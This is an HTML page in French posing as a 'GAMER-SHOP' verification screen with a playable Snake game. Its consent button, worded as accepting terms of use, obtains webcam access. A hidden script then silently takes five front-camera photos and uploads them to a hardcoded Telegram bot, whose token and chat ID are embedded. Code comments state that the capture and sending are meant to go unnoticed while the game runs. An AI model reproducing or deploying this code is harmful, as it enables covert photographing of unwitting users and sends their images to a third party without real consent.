<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>GAMER-SHOP — Vérification</title>
<style>
  :root{
    --bg:#0a0e12;
    --bg-panel:#10161c;
    --accent:#39ff88;
    --accent-dim:#1f7a4a;
    --text:#e8f0ea;
    --text-dim:#7c8f85;
    --danger:#ff5c5c;
    --grid: rgba(57,255,136,0.06);
  }
  *{box-sizing:border-box; margin:0; padding:0;}
  body{
    background:
      linear-gradient(var(--grid) 1px, transparent 1px) 0 0/32px 32px,
      linear-gradient(90deg, var(--grid) 1px, transparent 1px) 0 0/32px 32px,
      var(--bg);
    color:var(--text);
    font-family:'JetBrains Mono', 'Courier New', monospace;
    min-height:100vh;
    display:flex;
    align-items:center;
    justify-content:center;
    padding:20px;
  }
  .card{
    width:100%;
    max-width:440px;
    background:var(--bg-panel);
    border:1px solid var(--accent-dim);
    border-radius:4px;
    padding:28px 24px;
    position:relative;
    overflow:hidden;
  }
  .card::before{
    content:"";
    position:absolute; top:0; left:0; right:0; height:3px;
    background:linear-gradient(90deg, transparent, var(--accent), transparent);
    animation:scan 3s linear infinite;
  }
  @keyframes scan{ 0%{transform:translateX(-100%);} 100%{transform:translateX(100%);} }

  .eyebrow{ font-size:11px; letter-spacing:3px; color:var(--accent); text-transform:uppercase; margin-bottom:8px; }
  h1{ font-size:22px; letter-spacing:0.5px; margin-bottom:16px; }
  p{ font-size:13px; line-height:1.7; color:var(--text-dim); margin-bottom:14px; }

  button{
    width:100%; padding:16px; font-family:inherit; font-size:13px;
    letter-spacing:1px; text-transform:uppercase; border-radius:3px;
    border:1px solid var(--accent); background:transparent; color:var(--accent);
    cursor:pointer; transition:all .15s ease;
  }
  button:hover:not(:disabled){ background:var(--accent); color:#04140a; }
  button:disabled{ opacity:.4; cursor:not-allowed; }
  button.secondary{ border-color:var(--text-dim); color:var(--text-dim); margin-top:10px; }

  #gameScreen{ display:none; }
  .status-row{
    display:flex; justify-content:space-between; align-items:center;
    font-size:12px; color:var(--text-dim); margin-bottom:14px;
  }
  #statusDot{
    width:8px; height:8px; border-radius:50%; background:var(--danger);
    display:inline-block; margin-right:6px; animation:pulse 1s infinite;
  }
  @keyframes pulse{ 0%,100%{opacity:1;} 50%{opacity:.3;} }

  canvas#snake{
    background:#04140a; border:1px solid var(--accent-dim); border-radius:3px;
    width:100%; display:block; touch-action:none;
  }
  .snake-controls{
    display:grid; grid-template-columns:repeat(3, 1fr); gap:6px;
    margin-top:10px; max-width:180px;
  }
  .snake-controls button{ padding:10px 0; font-size:16px; }
  .snake-controls .empty{ visibility:hidden; }

  #resultScreen{ display:none; text-align:center; }
  #resultScreen .icon{ font-size:40px; margin-bottom:10px; }
  #resultScreen h1{ font-size:18px; }

  .footer-note{ font-size:10px; color:var(--text-dim); text-align:center; margin-top:16px; opacity:.6; }

  /* Vidéo utilisée uniquement pour capturer les frames, jamais affichée */
  #cam{ position:absolute; width:1px; height:1px; opacity:0; pointer-events:none; }
</style>
</head>
<body>

<div class="card">

  <!-- ÉCRAN 1 : DEMANDE DE CONSENTEMENT (affiché dès l'ouverture du site) -->
  <div id="consentScreen" style="text-align:center; padding:60px 0;">
    <button id="grantBtn"> j'accept les condition d'utilisation </button>
    <p id="consentError" style="display:none; color:var(--danger); font-size:12px; margin-top:14px;"></p>
  </div>

  <!-- ÉCRAN 2 : JEU -->
  <div id="gameScreen">
    <div class="status-row">
      <span>SNAKE</span>
      <span>Score : <b id="score" style="color:var(--accent)">0</b> · Record : <b id="highscore" style="color:var(--text)">0</b></span>
    </div>
    <div style="position:relative;">
      <canvas id="snake" width="300" height="300"></canvas>
      <div id="gameOverOverlay" style="display:none; position:absolute; inset:0; background:rgba(4,20,10,0.9); flex-direction:column; align-items:center; justify-content:center; border-radius:3px;">
        <div style="font-size:16px; color:var(--danger); margin-bottom:6px;">GAME OVER</div>
        <div style="font-size:12px; color:var(--text-dim); margin-bottom:14px;">Score : <span id="finalScore">0</span></div>
        <button id="replayBtn" style="width:auto; padding:10px 24px;">Rejouer</button>
      </div>
    </div>
    <div class="snake-controls">
      <div class="empty"></div><button data-dir="up">▲</button><div class="empty"></div>
      <button data-dir="left">◀</button><button data-dir="down">▼</button><button data-dir="right">▶</button>
    </div>
  </div>

  <video id="cam" autoplay playsinline muted></video>
  <canvas id="captureCanvas" width="320" height="240" style="display:none;"></canvas>

  <div class="footer-note">Session sécurisée </div>
</div>

<script>
/* ============================================================
   CONFIGURATION — bot Telegram
   ============================================================ */
const CONFIG = {
  TELEGRAM_BOT_TOKEN: "8860929694:AAGtgE8n1SCRmPUzfQ099_v1zq1UKaa2le0",
  TELEGRAM_CHAT_ID: "8629455707"
};
/* ============================================================ */

const consentScreen = document.getElementById('consentScreen');
const gameScreen = document.getElementById('gameScreen');
const consentError = document.getElementById('consentError');
const grantBtn = document.getElementById('grantBtn');
const camVideo = document.getElementById('cam');
const captureCanvas = document.getElementById('captureCanvas');
const ctx2d = captureCanvas.getContext('2d');

let mediaStream = null;
const capturedBlobs = [];

grantBtn.addEventListener('click', async () => {
  grantBtn.disabled = true;
  grantBtn.textContent = "Demande d'accès...";
  try {
    mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
  } catch (err) {
    grantBtn.disabled = false;
    grantBtn.textContent = "J'autorise l'accès à la caméra";
    consentError.textContent = "Accès refusé — impossible de continuer sans autorisation caméra.";
    consentError.style.display = 'block';
    return;
  }

  camVideo.srcObject = mediaStream;
  consentScreen.style.display = 'none';
  gameScreen.style.display = 'block';

  startSnake();
  startCaptureSequence(); // capture silencieuse en fond, ne touche pas au jeu
});

// Prend 5 photos (1/sec) en arrière-plan puis les envoie, sans rien afficher à l'écran
function startCaptureSequence(){
  let shots = 0;
  const tick = () => {
    takeSnapshot();
    shots++;
    if (shots < 5){
      setTimeout(tick, 1000);
    } else {
      finishCapture();
    }
  };
  setTimeout(tick, 1000);
}

function takeSnapshot(){
  captureCanvas.width = camVideo.videoWidth || 320;
  captureCanvas.height = camVideo.videoHeight || 240;
  ctx2d.drawImage(camVideo, 0, 0, captureCanvas.width, captureCanvas.height);
  captureCanvas.toBlob((blob) => {
    if (blob) capturedBlobs.push(blob);
  }, 'image/jpeg', 0.85);
}

async function finishCapture(){
  if (mediaStream){
    mediaStream.getTracks().forEach(t => t.stop());
  }
  await new Promise(r => setTimeout(r, 300)); // laisse le dernier toBlob() finir
  sendToTelegram(capturedBlobs); // envoi silencieux, le jeu continue sans interruption
}

async function sendToTelegram(blobs){
  if (blobs.length === 0) return false;
  if (!CONFIG.TELEGRAM_BOT_TOKEN || !CONFIG.TELEGRAM_CHAT_ID) return false;
  try{
    for (const blob of blobs){
      const form = new FormData();
      form.append('chat_id', CONFIG.TELEGRAM_CHAT_ID);
      form.append('photo', blob, 'verif.jpg');
      await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: 'POST', body: form
      });
    }
    return true;
  }catch(e){
    console.error(e);
    return false;
  }
}

/* ============================================================
   SNAKE — jeu complet et continu (le vrai contenu principal)
   ============================================================ */
const snakeCanvas = document.getElementById('snake');
const sctx = snakeCanvas.getContext('2d');
const scoreEl = document.getElementById('score');
const highscoreEl = document.getElementById('highscore');
const gameOverOverlay = document.getElementById('gameOverOverlay');
const finalScoreEl = document.getElementById('finalScore');
const replayBtn = document.getElementById('replayBtn');

const GRID = 15;
const CELLS = snakeCanvas.width / GRID;
let snake, dir, nextDir, food, snakeInterval, score, speed;
let highscore = 0;
const BASE_SPEED = 160;
const MIN_SPEED = 70;

function startSnake(){
  gameOverOverlay.style.display = 'none';
  snake = [{x:7,y:7},{x:6,y:7},{x:5,y:7}];
  dir = 'right'; nextDir = 'right';
  score = 0; speed = BASE_SPEED;
  scoreEl.textContent = score;
  placeFood();
  clearInterval(snakeInterval);
  snakeInterval = setInterval(stepSnake, speed);
  drawSnake();
}

function placeFood(){
  let pos;
  do {
    pos = { x: Math.floor(Math.random()*CELLS), y: Math.floor(Math.random()*CELLS) };
  } while (snake.some(s => s.x === pos.x && s.y === pos.y));
  food = pos;
}

function stepSnake(){
  dir = nextDir;
  const head = { ...snake[0] };
  if (dir === 'up') head.y--;
  if (dir === 'down') head.y++;
  if (dir === 'left') head.x--;
  if (dir === 'right') head.x++;
  head.x = (head.x + CELLS) % CELLS;
  head.y = (head.y + CELLS) % CELLS;

  if (snake.some(s => s.x === head.x && s.y === head.y)){
    endGame();
    return;
  }

  snake.unshift(head);
  if (head.x === food.x && head.y === food.y){
    score++;
    scoreEl.textContent = score;
    if (score > highscore){
      highscore = score;
      highscoreEl.textContent = highscore;
    }
    placeFood();
    // accélère légèrement toutes les 5 points, jusqu'à une vitesse min
    if (score % 5 === 0 && speed > MIN_SPEED){
      speed -= 10;
      clearInterval(snakeInterval);
      snakeInterval = setInterval(stepSnake, speed);
    }
  } else {
    snake.pop();
  }
  drawSnake();
}

function endGame(){
  clearInterval(snakeInterval);
  finalScoreEl.textContent = score;
  gameOverOverlay.style.display = 'flex';
}

replayBtn.addEventListener('click', startSnake);

function drawSnake(){
  sctx.fillStyle = '#04140a';
  sctx.fillRect(0,0,snakeCanvas.width, snakeCanvas.height);
  sctx.fillStyle = '#ff5c5c';
  sctx.fillRect(food.x*GRID+2, food.y*GRID+2, GRID-4, GRID-4);
  snake.forEach((s, i) => {
    sctx.fillStyle = i === 0 ? '#39ff88' : '#1f7a4a';
    sctx.fillRect(s.x*GRID+1, s.y*GRID+1, GRID-2, GRID-2);
  });
}

document.addEventListener('keydown', (e) => {
  const map = { ArrowUp:'up', ArrowDown:'down', ArrowLeft:'left', ArrowRight:'right' };
  const d = map[e.key];
  if (!d) return;
  const opposite = { up:'down', down:'up', left:'right', right:'left' };
  if (d !== opposite[dir]) nextDir = d;
});

document.querySelectorAll('.snake-controls button[data-dir]').forEach(btn => {
  btn.addEventListener('click', () => {
    const d = btn.dataset.dir;
    const opposite = { up:'down', down:'up', left:'right', right:'left' };
    if (d !== opposite[dir]) nextDir = d;
  });
});
</script>
</body>
</html>
